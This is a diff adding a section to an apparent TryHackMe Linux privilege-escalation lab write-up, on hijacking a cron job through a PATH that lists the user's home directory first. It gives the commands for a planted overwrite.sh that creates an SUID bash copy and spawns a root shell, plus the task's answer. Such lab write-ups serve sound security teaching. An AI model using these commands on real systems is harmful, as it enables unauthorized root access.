@@ -51,6 +51,11 @@
 ### [8. Cron Jobs - File Permissions](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Linux%20PrivEsc#8-cron-jobs---file-permissions-1)
 #### [&nbsp; 8.1: Read and follow along with the above.](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Linux%20PrivEsc#81-read-and-follow-along-with-the-above)
 
+<br />
+
+### [9: Cron Jobs - PATH Environment Variable]()
+#### [&nbsp; 9.1: What is the value of the PATH variable in /etc/crontab?]()
+
 
 <br />
 <br />
@@ -769,3 +774,67 @@ No answer needed
 
 <br/>
 <br/>
+
+## 9: Cron Jobs - PATH Environment Variable
+
+<br/>
+
+Viewing the `crontab` contents we notice the `PATH` variable is starts with our user's home directory.
+
+```
+cat /etc/crontab
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172364659-edd70214-5026-4a1b-8420-3863f47e0a84.png)
+
+Follow the instructions on the task to create an `overwrite.sh` file in our `/home/user/` directory - We can easily do this with `nano` using the `nano /home/user/overwrite.sh` command and saving the file with the following contents:
+
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+What this file will essentially do is copy the `/bin/bash` contents in a new `rootbash` file under the `/tmp` folder and set its permissions to an SUID executable. We now need to ensure the `overwrite.sh` file we created is an exectable as well so that its contents are executed when ran by cron.
+
+```
+chmod +x /home/user/overwrite.sh
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172365994-72594fe1-4dbe-43e9-ace5-b5a1a6c9b0cc.png)
+
+After cron picks up the task within a minute, running the `rootbash` file with SUID privileges using the `-p` option will spawn a root shell:
+
+```
+/tmp/rootbash -p
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172368694-6042e738-ab95-4d48-a587-cffd74e7e0f0.png)
+
+<br/>
+
+Remember to remove the modified code, remove the `/tmp/rootbash` executable and `exit` out of the elevated shell before continuing as you will create this file again later in the room!
+
+`rm /home/user/overwrite.sh`
+`rm /tmp/rootbash`
+`exit`
+
+![image](https://user-images.githubusercontent.com/14150485/172369341-1c156902-9890-41fd-9c1b-b2b5bf813028.png)
+
+<br/>
+
+### 9.1: What is the value of the PATH variable in /etc/crontab?
+
+<br/>
+
+The full path was listed when we first viewed the contents of the `/etc/crontab` file.
+
+```
+/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+<br/>
+<br/>
+
+
